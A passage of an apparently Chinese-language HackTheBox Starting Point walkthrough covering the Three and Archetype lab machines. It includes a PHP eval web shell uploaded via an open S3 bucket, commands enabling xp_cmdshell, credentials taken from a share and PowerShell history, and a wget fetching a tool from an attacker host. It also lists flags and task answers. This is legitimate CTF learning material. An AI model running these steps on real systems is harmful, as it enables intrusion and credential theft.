class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:ea81b7afddd03efaa0945333ed147fac<br></code></pre></td></tr></table></figure><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Task-1-4"><a href="#Task-1-4" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.131.234</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.131</span><span class="hljs-number">.234</span><br>Host is up (<span class="hljs-number">0.50</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.7</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">16.03</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h3 id="Task-2-4"><a href="#Task-2-4" class="headerlink" title="Task 2"></a>Task 2</h3><p><img src="https://img.dkdun.cn/v1/2025/12/8b55f16dce97c2ef.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> domain <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email address provided <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Contact&quot;</span> section <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> website?<br>:thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-3-4"><a href="#Task-3-4" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> absence <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> DNS server, which Linux <span class="hljs-built_in">file</span> can we use <span class="hljs-built_in">to</span> <span class="hljs-built_in">resolve</span> hostnames <span class="hljs-built_in">to</span> IP addresses <span class="hljs-keyword">in</span> order <span class="hljs-built_in">to</span> be able <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> websites that point <span class="hljs-built_in">to</span> those hostnames?<br>:/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-4-4"><a href="#Task-4-4" class="headerlink" title="Task 4"></a>Task 4</h3><p>用 gobuster 扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http:<span class="hljs-regexp">//</span>thetoppers.htb  --append-domain<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f53fb6547ca682e2.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which<span class="hljs-built_in"> sub-domain </span>is discovered during further enumeration?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:s3</span>.thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-5-4"><a href="#Task-5-4" class="headerlink" title="Task 5"></a>Task 5</h3><p>只有一条 json 信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/848b7df5aaf46e7f.png"></p><p>搜了一下 s3，Amazon S3, 全名 Amazon Simple Storage Service，Amazon 提供的网络数据存储服务</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Which service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> discovered sub-domain?<br>:Amazon S3<br></code></pre></td></tr></table></figure><h3 id="Task-6-4"><a href="#Task-6-4" class="headerlink" title="Task 6"></a>Task 6</h3><p>可以通过 AWSCLI 来与 s3 进行交互，具体请看 <a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html">AWS CLI</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which command <span class="hljs-type">line</span> utility can be used <span class="hljs-keyword">to</span> interact <span class="hljs-keyword">with</span> the service running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>:awscli<br></code></pre></td></tr></table></figure><h3 id="Task-7-4"><a href="#Task-7-4" class="headerlink" title="Task 7"></a>Task 7</h3><p>具体看官方文档</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">Which <span class="hljs-keyword">command</span> <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">up</span> the AWS CLI installation?<br>:aws configure<br></code></pre></td></tr></table></figure><h3 id="Task-8-3"><a href="#Task-8-3" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint</span> http:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">command</span> used by the above utility <span class="hljs-keyword">to</span> <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> of the S3 buckets?<br>:aws s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-3"><a href="#Task-9-3" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aws</span> --endpoint http://s3.thetoppers.htb s3 ls<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>          <span class="hljs-number">0</span> .htaccess<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>      <span class="hljs-number">11952</span> index.php<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> configured <span class="hljs-keyword">to</span> run files written <span class="hljs-keyword">in</span> what web scripting <span class="hljs-keyword">language</span>?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-4"><a href="#Submit-Flag-4" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>写一个一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> shell.php s3://thetoppers.htb/shell.php<br></code></pre></td></tr></table></figure><p>然后直接 curl</p><p><img src="https://img.dkdun.cn/v1/2025/12/3fe56a29ed468bdc.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:a980d99281a28d638ac68b9bf9453c2b<br></code></pre></td></tr></table></figure><h1 id="Tier-2"><a href="#Tier-2" class="headerlink" title="Tier 2"></a>Tier 2</h1><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="Task-1-5"><a href="#Task-1-5" class="headerlink" title="Task 1"></a>Task 1</h3><p>nmap 扫描，扫到了 1433 端口的 <code>ms-sql-s</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sC -sV <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">48</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">996</span> closed tcp ports (reset)<br>PORT     STATE SERVICE      VERSION<br><span class="hljs-number">135</span>/tcp  open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> microsoft-ds<br><span class="hljs-number">1433</span>/tcp open       Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span>; RTM<br>| ms-sql-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Version:<br>|       name: Microsoft SQL Server <span class="hljs-number">2017</span> RTM<br>|       number: <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span><br>|       Product: Microsoft SQL Server <span class="hljs-number">2017</span><br>|       Service pack level: RTM<br>|       Post-SP patches applied: false<br>|_    TCP port: <span class="hljs-number">1433</span><br>|_ssl-<span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">53</span>:<span class="hljs-number">01</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">2</span>s from scanner <span class="hljs-built_in">time</span>.<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| <span class="hljs-keyword">Not</span> valid before: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>|_Not valid after:  <span class="hljs-number">2055</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>| ms-sql-ntlm-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Target_Name: ARCHETYPE<br>|     NetBIOS_Domain_Name: ARCHETYPE<br>|     NetBIOS_Computer_Name: ARCHETYPE<br>|     DNS_Domain_Name: Archetype<br>|     DNS_Computer_Name: Archetype<br>|_    Product_Version: <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17763</span><br>Service Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-os-discovery:<br>|   OS: Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> (Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">6</span>.<span class="hljs-number">3</span>)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\x00<br>|   Workgroup: WORKGROUP\x00<br>|_  System <span class="hljs-built_in">time</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T00:<span class="hljs-number">52</span>:<span class="hljs-number">45</span>-<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>|_clock-skew: mean: <span class="hljs-number">1</span>h36m02s, deviation: <span class="hljs-number">3</span>h34m41s, median: <span class="hljs-number">1</span>s<br>| smb2-<span class="hljs-built_in">time</span>:<br>|   <span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">52</span>:<span class="hljs-number">46</span><br>|_  start_date: N/A<br>| smb2-security-<span class="hljs-built_in">mode</span>:<br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<br>|_    Message signing enabled but <span class="hljs-keyword">not</span> required<br>| smb-security-<span class="hljs-built_in">mode</span>:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">33</span>.<span class="hljs-number">51</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which TCP port <span class="hljs-keyword">is</span> hosting a <span class="hljs-keyword">database</span> <span class="hljs-keyword">server</span>?<br>:<span class="hljs-number">1433</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-5"><a href="#Task-2-5" class="headerlink" title="Task 2"></a>Task 2</h3><p>关于 SMB（服务器消息块）服务器是一种网络协议，允许设备通过网络共享文件、打印机和其他资源，通过网络促进客户端和服务器之间的通信，可以通过 <code>smbclient</code> 连接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# smbclient -N -L \\\\<span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span>\\<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>        <span class="hljs-keyword">ADMIN</span>$          Disk      Remote <span class="hljs-keyword">Admin</span><br>        backups         Disk<br>        C$              Disk      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        IPC$            IPC       Remote IPC<br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure><p>通过 IP 使用 <code>-N</code> 无密码连接，查看</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the non-Administrative <span class="hljs-keyword">share</span> available <span class="hljs-keyword">over</span> SMB?<br>:backups  <br></code></pre></td></tr></table></figure><h3 id="Task-3-5"><a href="#Task-3-5" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># smbclient -N \\\\10.129.215.139\\backups</span><br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; dir<br>  .                                   D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  ..                                  D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  prod.dtsConfig                     AR     <span class="hljs-number"> 609 </span> Mon Jan<span class="hljs-number"> 20 </span>20:23:02 2020<br><br>               <span class="hljs-number"> 5056511 </span>blocks of size 4096.<span class="hljs-number"> 2618271 </span>blocks available<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size<span class="hljs-number"> 609 </span>as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br>smb: \&gt; ^Z<br>[3]+  Stopped                 smbclient -N \\\\10.129.215.139\\backups<br></code></pre></td></tr></table></figure><p>把配置文件 <code>prod.dtsConfig</code> 下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# cat prod.dtsConfig<br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYP<br>        E\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><p><code>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> password identified <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">SMB</span> <span class="hljs-title">share</span>?<br>:M3g4c0rp123<br></code></pre></td></tr></table></figure><h3 id="Task-4-5"><a href="#Task-4-5" class="headerlink" title="Task 4"></a>Task 4</h3><p><a href="https://github.com/fortra/impacket">impacket</a></p><p>进入 <code>impacket/examples/</code> 执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py sql_svc@<span class="hljs-number">10.129.215.139</span> -windows-auth<br></code></pre></td></tr></table></figure><p>不知道为什么，我的只能执行用户 ID 为 <code>sql_svc</code>，而不是 <code>ARCHETYPE\sql_svc</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script <span class="hljs-keyword">from</span> Impacket collection can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> establish an authenticated <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> a Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>?<br>:mssqlclient.py<br></code></pre></td></tr></table></figure><h3 id="Task-5-5"><a href="#Task-5-5" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">SELECT is_srvrolemember(‘sysadmin’);<br></code></pre></td></tr></table></figure><p>检查是否有权限，返回 1 就是有</p><p><a href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a></p><p><code>SQL SERVER</code> 有一个 <code>xp_shell</code> 的扩展存储过程可以生成 <code>windows shell</code>，<code>xp_cmdshell</code> 是一个 SQL Server 的扩展存储过程，它允许执行操作系统命令。在默认情况下,<code>xp_cmdshell</code> 可能在 <code>SQL Server</code> 上被禁用，需要先启用它</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-meta">#启动 p_cmdshell</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">What extended <span class="hljs-keyword">stored</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">of</span> <span class="hljs-title">Microsoft</span> <span class="hljs-title">SQL</span> <span class="hljs-title">Server</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">used</span> <span class="hljs-title">in</span> <span class="hljs-title">order</span> <span class="hljs-title">to</span> <span class="hljs-title">spawn</span> <span class="hljs-title">a</span> <span class="hljs-title">Windows</span> <span class="hljs-title">command</span> <span class="hljs-title">shell</span>?</span><br><span class="hljs-function">:</span>xp_xmdshell<br></code></pre></td></tr></table></figure><h3 id="Task-6-5"><a href="#Task-6-5" class="headerlink" title="Task 6"></a>Task 6</h3><p>Windows 提权工具 <a href="https://github.com/peass-ng/PEASS-ng">winpeas</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">search</span> possible paths <span class="hljs-keyword">to</span> escalate <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> Windows hosts?<br>:winpeas<br></code></pre></td></tr></table></figure><h3 id="Task-7-5"><a href="#Task-7-5" class="headerlink" title="Task 7"></a>Task 7</h3><p>我先上传了 nc ，然后连上了靶机，所以就直接在里面 wget 了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> http://10.10.16.31:8000/winPEASx64.exe -o winPEASx64.exe<br></code></pre></td></tr></table></figure><p>然后直接运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./winPEASx64.exe<br></code></pre></td></tr></table></figure><p>查看 <code>Powershell Settings</code> 这里的数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/67eac352d7891d86.png"></p><p>查看 ps 的历史记录</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">PS <span class="hljs-name">C</span>:\users\sql_svc&gt; <span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>net.exe use <span class="hljs-name">T</span>: \\Archetype\backups /<span class="hljs-name">user</span>:administrator MEGACORP_4dm1n!!<br>exit<br></code></pre></td></tr></table></figure><p>拿到密码：MEGACORP_4dm1n!!</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> administrator&#x27;s password?<br>:ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-5"><a href="#Submit-Flag-5" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>wsl 另外起一个 http 服务，目录下要存在 <code>nc64.exe</code> 